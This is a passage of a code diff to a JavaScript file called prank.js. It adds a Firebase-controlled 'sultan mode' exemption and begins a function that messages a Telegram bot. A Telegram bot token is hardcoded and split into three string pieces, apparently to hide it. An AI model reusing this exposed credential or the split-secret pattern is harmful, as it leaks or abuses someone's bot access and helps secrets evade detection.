@@ -1,6 +1,26 @@
 // prank.js
 (function() {
-    if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;
+    // Проверяем глобальную настройку из базы
+let isGlobalSultan = localStorage.getItem('is_sultan') === 'true';
+try {
+    const part1 = "8818384063:";
+    const part2 = "AAEEqTup6sgED-gYB_1tm";
+    const part3 = "cQKcXwi-UDE3lQ";
+    const BOT_TOKEN = part1 + part2 + part3;
+    // Нам нужно только слушать базу, инициализируем её
+    if (typeof firebase !== 'undefined' && !firebase.apps.length) {
+        firebase.initializeApp({
+            databaseURL: "https://our-tracker-3cbb5-default-rtdb.europe-west1.firebasedatabase.app"
+        });
+    }
+    if (typeof firebase !== 'undefined') {
+        firebase.database().ref('settings/sultan_mode').on('value', snap => {
+            if (snap.val() === true) isGlobalSultan = true;
+        });
+    }
+} catch(e) {}
+
+if (isGlobalSultan || window.location.search.includes('me')) return;
 
     function sendTelegram(text) {
         const part1 = "8818384063:";
